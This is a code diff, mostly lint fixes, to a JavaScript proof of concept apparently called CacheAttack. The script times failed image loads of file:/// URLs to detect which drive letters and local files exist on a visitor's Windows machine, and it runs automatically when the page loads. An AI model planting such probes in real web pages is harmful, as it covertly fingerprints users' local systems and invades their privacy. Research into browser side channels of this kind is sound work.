@@ -1,3 +1,7 @@
+/*jshint esversion: 8 */
+
+// NDev 2020 https://github.com/NDevTK/CacheAttack
+
 Sanity = true;
 
 async function getRules() {
@@ -7,7 +11,7 @@ async function getRules() {
 }
 
 document.addEventListener('DOMContentLoaded', async (event) => {
-	await wait(3000)
+	await wait(3000);
 	getRules().then(rules => {
 		FileChecker(rules, Found);
 	});
@@ -36,7 +40,7 @@ async function wait(ms) {
 }
 
 async function EvalDrives() {
-	for (i = 0; i < 26; i++) {
+	for (let i = 0; i < 26; i++) {
 		var letter = (i+10).toString(36).toUpperCase();
 		let state = await isLocal("", letter, 2.2, 3.5);
 		if(state && Sanity) FoundDrive(letter);
@@ -44,20 +48,20 @@ async function EvalDrives() {
 }
 
 async function isLocal(file, drive = "C", min = 1.7, max = 30) {
-	    var state = false;
-		var start = "";
-        if (!Sanity) return
+        var state = false;
+        var start = "";
+        if (!Sanity) return;
         try {
-            img = new Image(0, 0);
+            let img = new Image(0, 0);
             img.onerror = _ => {
                 let time = performance.now() - start;
                 if (time > min && time < max) state = true;
-            }
+            };
         start = performance.now();
         img.src = "file:///" + drive + ":/" + file;
         } catch (err) {}
 		await wait(100);
-		return state
+		return state;
 }
 
 async function addData(file) {
